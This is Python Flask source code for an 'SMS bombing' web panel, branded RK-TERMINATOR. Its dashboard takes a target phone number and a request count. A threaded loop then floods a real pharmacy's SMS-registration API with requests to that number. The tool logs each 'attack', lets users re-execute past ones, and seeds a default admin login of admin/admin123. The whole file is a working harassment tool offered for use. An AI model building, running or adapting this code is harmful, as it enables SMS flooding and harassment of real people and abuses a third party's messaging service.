import requests
import threading
import os
import time
import sqlite3
import random
from datetime import datetime, timedelta, timezone
from concurrent.futures import ThreadPoolExecutor
from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for
from werkzeug.security import generate_password_hash, check_password_hash

app = Flask(__name__)
app.secret_key = os.urandom(32)

# ---------- [SYSTEM SETTINGS] ----------
VERSION = "V.24.02.26"
FOOTER_TEXT = "This System Created By RK-SYSTEM 2026"

def get_bd_time():
    return datetime.now(timezone(timedelta(hours=6)))

# ---------- [DATABASE SETUP] ----------
def get_db():
    conn = sqlite3.connect('rk_v24_premium.db', check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with get_db() as conn:
        conn.execute('''CREATE TABLE IF NOT EXISTS history (
            id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, phone TEXT, 
            success INTEGER, fail INTEGER, total INTEGER, limit_amt INTEGER, 
            status TEXT, start_time TEXT, stop_time TEXT, duration TEXT, 
            date_str TEXT, timestamp DATETIME)''')
        conn.execute("CREATE TABLE IF NOT EXISTS users (username TEXT UNIQUE, password TEXT, status TEXT)")
        try:
            conn.execute("INSERT INTO users VALUES (?, ?, ?)", ("admin", generate_password_hash("admin123"), "active"))
        except: pass

init_db()

# ---------- [CORE ENGINE] ----------
active_sessions = {}

def send_request(phone):
    api_list = ["https://shop.pharmaid-rx.com/api/sendSMSRegistration?mobileNumber={}"]
    try:
        res = requests.get(random.choice(api_list).format(phone), timeout=6)
        return res.status_code == 200
    except: return False

def bombing_task(username, phone, limit, start_dt):
    key = f"{username}_{phone}"
    with ThreadPoolExecutor(max_workers=5) as executor:
        while key in active_sessions:
            curr = active_sessions[key]
            if curr['total'] >= curr['limit'] or curr['status'] == 'Stopped': break
            if curr['status'] == 'Running':
                now = get_bd_time()
                elapsed = now - start_dt
                active_sessions[key]['running_time'] = str(elapsed).split('.')[0]
                if executor.submit(send_request, phone).result():
                    active_sessions[key]['success'] += 1
                else: active_sessions[key]['fail'] += 1
                active_sessions[key]['total'] += 1
                if active_sessions[key]['total'] > 1:
                    avg = elapsed.total_seconds() / active_sessions[key]['total']
                    active_sessions[key]['eta'] = str(timedelta(seconds=int(avg * (limit - active_sessions[key]['total']))))
                time.sleep(0.15)
            else: time.sleep(1)

    stop_dt = get_bd_time()
    s = active_sessions.get(key)
    if s and s['status'] != 'Paused':
        with get_db() as conn:
            conn.execute("INSERT INTO history (username, phone, success, fail, total, limit_amt, status, start_time, stop_time, duration, date_str, timestamp) VALUES (?,?,?,?,?,?,?,?,?,?,?,?)",
                (username, phone, s['success'], s['fail'], s['total'], limit, "Completed", s['start_time'], stop_dt.strftime("%I:%M %p"), s['running_time'], start_dt.strftime("%d/%m/%Y"), start_dt))
        del active_sessions[key]

# ---------- [PREMIUM HACKER UI] ----------
LAYOUT = f'''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RK-V24 PREMIUM</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;900&family=Rajdhani:wght@500;700&family=Fira+Code:wght@300;500&display=swap" rel="stylesheet">
    <style>
        :root {{ --neon: #00ffcc; --bg: #030303; --card: #0a0a0a; --red: #ff0055; --blue: #00ccff; --gold: #ffcc00; --purple: #bc13fe; }}
        * {{ box-sizing: border-box; }}
        body {{ background: var(--bg); color: #fff; font-family: 'Rajdhani', sans-serif; margin: 0; overflow-x: hidden; }}
        
        /* Matrix Background Effect */
        body::before {{
            content: ""; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: linear-gradient(rgba(0,0,0,0.9), rgba(0,0,0,0.9)), url('https://i.makeagif.com/media/10-22-2015/v-nU-j.gif');
            background-size: cover; z-index: -1; opacity: 0.2;
        }}

        .nav {{ background: rgba(0,0,0,0.8); backdrop-filter: blur(10px); padding: 15px 25px; border-bottom: 2px solid var(--neon); display: flex; justify-content: space-between; align-items: center; position: sticky; top:0; z-index:1000; box-shadow: 0 0 20px var(--neon); }}
        .logo {{ font-family: 'Orbitron'; font-weight: 900; color: var(--neon); text-shadow: 0 0 15px var(--neon); letter-spacing: 2px; }}
        
        .three-dot {{ cursor: pointer; padding: 10px; }}
        .dot {{ height: 5px; width: 5px; background: var(--neon); border-radius: 50%; display: block; margin: 3px; box-shadow: 0 0 8px var(--neon); }}
        
        .menu-dropdown {{ 
            position: absolute; right: 20px; top: 70px; background: rgba(10,10,10,0.95); border: 1px solid var(--neon); 
            border-radius: 12px; width: 240px; display: none; z-index: 2000; backdrop-filter: blur(15px);
            box-shadow: 0 0 40px rgba(0,255,204,0.3); overflow: hidden; animation: slideDown 0.3s ease;
        }}
        @keyframes slideDown {{ from {{ opacity:0; transform: translateY(-10px); }} to {{ opacity:1; transform: translateY(0); }} }}
        .menu-dropdown a {{ display: block; padding: 15px 20px; color: #fff; text-decoration: none; font-family: 'Orbitron'; font-size: 10px; border-bottom: 1px solid rgba(255,255,255,0.05); transition: 0.3s; }}
        .menu-dropdown a:hover {{ background: var(--neon); color: #000; box-shadow: inset 0 0 15px #000; }}

        .container {{ padding: 25px; max-width: 550px; margin: auto; min-height: 80vh; }}
        
        /* Animated RGB Frame */
        .monitor-frame {{ position: relative; background: #000; border-radius: 20px; padding: 3px; overflow: hidden; margin-bottom: 30px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }}
        .monitor-frame::before {{ content: ""; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: conic-gradient(transparent, var(--neon), var(--blue), var(--purple), var(--gold), transparent); animation: rotate 4s linear infinite; }}
        @keyframes rotate {{ from {{ transform: rotate(0deg); }} to {{ transform: rotate(360deg); }} }}
        
        .monitor-content {{ position: relative; background: var(--card); border-radius: 18px; padding: 25px; z-index: 2; border: 1px solid rgba(255,255,255,0.05); }}
        
        .premium-label {{ font-family: 'Orbitron'; font-size: 10px; color: var(--gold); border: 1px solid var(--gold); padding: 2px 8px; border-radius: 50px; text-shadow: 0 0 5px var(--gold); }}

        h3 {{ font-family: 'Orbitron'; letter-spacing: 1px; text-transform: uppercase; margin-top: 0; }}
        
        .info-grid {{ display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 20px; }}
        .info-box {{ background: linear-gradient(145deg, #111, #080808); border: 1px solid #222; padding: 15px; border-radius: 12px; text-align: center; transition: 0.3s; }}
        .info-box:hover {{ border-color: var(--neon); transform: translateY(-3px); }}
        .info-box span {{ display: block; font-size: 10px; color: #aaa; margin-bottom: 5px; font-weight: 700; }}
        .info-box b {{ font-family: 'Fira Code', monospace; font-size: 1.2rem; }}

        input {{ width: 100%; padding: 16px; margin: 12px 0; background: #000; border: 1px solid #333; color: var(--neon); border-radius: 12px; font-family: 'Fira Code'; outline: none; transition: 0.3s; border-left: 4px solid var(--neon); }}
        input:focus {{ border-color: var(--neon); box-shadow: 0 0 15px rgba(0,255,204,0.2); }}
        
        .btn-turbo {{ background: linear-gradient(45deg, var(--neon), var(--blue)); color: #000; border: none; padding: 18px; width: 100%; border-radius: 12px; font-family: 'Orbitron'; font-weight: 900; cursor: pointer; text-transform: uppercase; transition: 0.3s; box-shadow: 0 5px 15px rgba(0,255,204,0.3); }}
        .btn-turbo:hover {{ transform: scale(1.02); filter: brightness(1.2); }}

        .btn-ctrl {{ flex: 1; padding: 12px; border: none; border-radius: 10px; font-family: 'Orbitron'; font-size: 10px; font-weight: 900; cursor: pointer; }}
        .bg-pause {{ background: var(--gold); color: #000; }}
        .bg-stop {{ background: var(--red); color: #fff; }}

        .footer {{ text-align: center; padding: 30px; font-family: 'Fira Code'; font-size: 12px; color: #555; border-top: 1px solid #111; margin-top: 50px; }}
        .v-tag {{ color: var(--neon); font-weight: bold; }}

        .c-neon {{ color: var(--neon); }} .c-blue {{ color: var(--blue); }} .c-gold {{ color: var(--gold); }} .c-red {{ color: var(--red); }}
    </style>
</head>
<body onclick="document.getElementById('mBox').style.display='none'">
    <audio id="snd_start" src="https://assets.mixkit.co/active_storage/sfx/2571/2571-preview.mp3"></audio>
    
    <nav class="nav">
        <div class="logo" onclick="location.href='/dashboard'">RK-TERMINATOR</div>
        <div class="three-dot" onclick="event.stopPropagation(); let m=document.getElementById('mBox'); m.style.display=(m.style.display==='block'?'none':'block')">
            <span class="dot"></span><span class="dot"></span><span class="dot"></span>
        </div>
    </nav>

    <div class="menu-dropdown" id="mBox">
        <a href="/history"><b class="c-neon">01.</b> ALL HISTORY</a>
        <a href="/running-logs"><b class="c-gold">02.</b> RUNNING MISSIONS</a>
        <a href="/last-attack"><b class="c-blue">03.</b> LAST ANALYTICS</a>
        <a href="https://t.me/your_admin" target="_blank"><b class="c-purple">04.</b> SYSTEM ADMIN</a>
        <a href="/profile"><b class="c-blue">05.</b> USER PROFILES</a>
        <a href="/logout" style="color:var(--red); border-top: 1px solid #333;"><b class="c-red">XX.</b> DISCONNECT</a>
    </div>

    <div class="container">[CONTENT]</div>

    <div class="footer">
        {FOOTER_TEXT}<br>
        <span class="v-tag">{VERSION}</span>
    </div>

    <script>
        function sync() {{
            let area = document.getElementById('live-engine'); if(!area) return;
            fetch('/api/status').then(r=>r.json()).then(data=>{{
                let html = '';
                for(let k in data){{
                    let s = data[k]; let p = (s.total/s.limit)*100;
                    html += `<div class="monitor-frame"><div class="monitor-content">
                        <div style="display:flex; justify-content:space-between; align-items:center;">
                            <b>TARGET: <span class="c-blue">${{s.phone}}</span></b>
                            <span class="premium-label">${{s.status}}</span>
                        </div>
                        <div style="height:6px; background:#111; border-radius:10px; margin:20px 0; overflow:hidden; border:1px solid #222;">
                            <div style="height:100%; width:${{p}}%; background:linear-gradient(90deg, var(--neon), var(--blue)); box-shadow:0 0 10px var(--neon); transition:0.5s;"></div>
                        </div>
                        <div style="display:flex; justify-content:space-between; font-size:0.75rem; font-family:'Fira Code'; color:var(--gold); margin-bottom:15px;">
                            <span>ACTIVE: ${{s.running_time}}</span><span>ETA: ${{s.eta}}</span>
                        </div>
                        <div class="info-grid">
                            <div class="info-box"><span>SUCCESS</span><b class="c-neon">${{s.success}}</b></div>
                            <div class="info-box"><span>FAILED</span><b class="c-red">${{s.fail}}</b></div>
                            <div class="info-box"><span>PACKETS</span><b>${{s.total}}/${{s.limit}}</b></div>
                            <div class="info-box"><span>INITIALIZED</span><b style="font-size:0.7rem;">${{s.start_time}}</b></div>
                        </div>
                        <div style="display:flex; gap:12px; margin-top:20px;">
                            <button class="btn-ctrl bg-pause" onclick="location.href='/api/control?num=${{s.phone}}&action=${{s.status==='Running'?'Paused':'Running'}}'">${{s.status==='Running'?'PAUSE':'RESUME'}}</button>
                            <button class="btn-ctrl bg-stop" onclick="location.href='/api/stop?num=${{s.phone}}'">TERMINATE</button>
                        </div>
                    </div></div>`;
                }} area.innerHTML = html;
            }});
        }} setInterval(sync, 1500);
    </script>
</body></html>
'''

# ---------- [ROUTES] ----------
@app.route('/')
def root(): return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        u, p = request.form.get('u'), request.form.get('p')
        with get_db() as conn:
            user = conn.execute("SELECT * FROM users WHERE username=?", (u,)).fetchone()
        if user and check_password_hash(user['password'], p):
            session['user'] = u; return redirect(url_for('dashboard'))
    return render_template_string(LAYOUT.replace('[CONTENT]', '<div class="monitor-frame"><div class="monitor-content" style="text-align:center;"><h3 class="c-neon">SYSTEM AUTHENTICATION</h3><form method="POST"><input name="u" placeholder="ACCESS ID"><input name="p" type="password" placeholder="SECRET KEY"><button class="btn-turbo">ESTABLISH CONNECTION</button></form></div></div>'))

@app.route('/dashboard')
def dashboard():
    if 'user' not in session: return redirect(url_for('login'))
    return render_template_string(LAYOUT.replace('[CONTENT]', '<div class="monitor-frame"><div class="monitor-content"><h3 class="c-neon">⚡ CRITICAL BOMBING UNIT</h3><form action="/api/start" onsubmit="document.getElementById(\'snd_start\').play()"><input name="num" placeholder="TARGET PHONE" required><input name="amt" type="number" placeholder="PACKET LIMIT" required><button class="btn-turbo">EXECUTE ATTACK</button></form></div></div><div id="live-engine"></div>'))

@app.route('/history')
def history():
    if 'user' not in session: return redirect(url_for('login'))
    with get_db() as conn: logs = conn.execute("SELECT phone, COUNT(*) as sessions, SUM(success) as total_ok FROM history GROUP BY phone ORDER BY id DESC").fetchall()
    html = '<h3 class="c-blue">📂 ARCHIVED MISSIONS (Grouped)</h3>'
    for l in logs:
        html += f'<div class="monitor-frame" onclick="location.href=\'/history/{l["phone"]}\'"><div class="monitor-content" style="cursor:pointer; display:flex; justify-content:space-between; align-items:center;"><b class="c-gold">{l["phone"]}</b><div style="text-align:right;"><small>Hits: {l["total_ok"]}</small><br><small style="color:var(--neon)">Sessions: {l["sessions"]}</small></div></div></div>'
    return render_template_string(LAYOUT.replace('[CONTENT]', html))

@app.route('/history/<num>')
def history_detail(num):
    if 'user' not in session: return redirect(url_for('login'))
    with get_db() as conn: logs = conn.execute("SELECT * FROM history WHERE phone=? ORDER BY id DESC", (num,)).fetchall()
    html = f'<h3>📜 LOG DETAILS: <span class="c-blue">{num}</span></h3>'
    for l in logs:
        html += f'''<div class="monitor-frame"><div class="monitor-content">
            <div style="border-bottom:1px solid #222; padding-bottom:10px; margin-bottom:10px; display:flex; justify-content:space-between;">
                <span class="c-gold">{l["date_str"]}</span><span class="c-neon">{l["start_time"]}</span>
            </div>
            <div style="font-family:\'Fira Code\'; font-size:13px;">
                SUCCESS: <span class="c-neon">{l["success"]}</span> | FAIL: <span class="c-red">{l["fail"]}</span><br>
                DURATION: {l["duration"]} | STOP: {l["stop_time"]}
            </div>
            <button class="btn-turbo" style="margin-top:15px; padding:8px; font-size:10px;" onclick="location.href='/api/start?num={num}&amt={l["limit_amt"]}'">RE-EXECUTE ({l["limit_amt"]})</button>
        </div></div>'''
    return render_template_string(LAYOUT.replace('[CONTENT]', html))

@app.route('/last-attack')
def last_attack():
    if 'user' not in session: return redirect(url_for('login'))
    with get_db() as conn: l = conn.execute("SELECT * FROM history ORDER BY id DESC LIMIT 1").fetchone()
    if not l: return redirect(url_for('dashboard'))
    return render_template_string(LAYOUT.replace('[CONTENT]', f'<h3>🔥 LAST SESSION ANALYTICS</h3><div class="monitor-frame"><div class="monitor-content"><b class="c-blue" style="font-size:1.5rem;">{l["phone"]}</b><hr style="border:0; border-top:1px solid #222; margin:15px 0;"><div class="info-grid"><div class="info-box"><span>SUCCESS</span><b class="c-neon">{l["success"]}</b></div><div class="info-box"><span>TIME</span><b>{l["start_time"]}</b></div></div></div></div>'))

@app.route('/profile', methods=['GET', 'POST'])
def profile():
    if 'user' not in session: return redirect(url_for('login'))
    msg = ""
    if request.method == 'POST':
        old, new = request.form.get('old'), request.form.get('new')
        with get_db() as conn:
            user = conn.execute("SELECT * FROM users WHERE username=?", (session['user'],)).fetchone()
            if check_password_hash(user['password'], old):
                conn.execute("UPDATE users SET password=? WHERE username=?", (generate_password_hash(new), session['user']))
                msg = "KEY UPDATED SUCCESSFULLY!"
            else: msg = "INVALID CURRENT KEY!"
    return render_template_string(LAYOUT.replace('[CONTENT]', f'''<div class="monitor-frame"><div class="monitor-content"><h3>👤 PROFILE SETTINGS</h3><p>IDENTIFIER: <span class="c-blue">{session['user']}</span></p><hr style="border-color:#222;"><h4 class="c-gold">UPDATE SYSTEM KEY</h4><p class="c-neon" style="font-size:12px;">{msg}</p><form method="POST"><input name="old" type="password" placeholder="CURRENT SECRET KEY"><input name="new" type="password" placeholder="NEW SECRET KEY"><button class="btn-turbo">SECURE UPDATE</button></form></div></div>'''))

@app.route('/running-logs')
def running_logs(): return render_template_string(LAYOUT.replace('[CONTENT]', '<h3 class="c-gold">📡 LIVE INTERCEPTIONS</h3><div id="live-engine"></div>'))

@app.route('/api/start')
def api_start():
    u, num, amt = session.get('user'), request.args.get('num'), request.args.get('amt')
    if u and num and amt:
        now = get_bd_time(); key = f"{u}_{num}"
        active_sessions[key] = {'phone': num, 'success': 0, 'fail': 0, 'total': 0, 'limit': int(amt), 'status': 'Running', 'start_time': now.strftime("%I:%M %p"), 'running_time': '0:00:00', 'eta': 'CALCULATING...'}
        threading.Thread(target=bombing_task, args=(u, num, int(amt), now), daemon=True).start()
    return redirect(url_for('dashboard'))

@app.route('/api/status')
def api_status(): return jsonify({k: v for k, v in active_sessions.items() if k.startswith(session.get('user', ''))})

@app.route('/api/control')
def api_control():
    key = f"{session['user']}_{request.args.get('num')}"
    if key in active_sessions: active_sessions[key]['status'] = request.args.get('action')
    return redirect(url_for('dashboard'))

@app.route('/api/stop')
def api_stop():
    key = f"{session['user']}_{request.args.get('num')}"
    if key in active_sessions: active_sessions[key]['status'] = 'Stopped'
    return redirect(url_for('dashboard'))

@app.route('/logout')
def logout(): session.clear(); return redirect(url_for('login'))

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=54300)
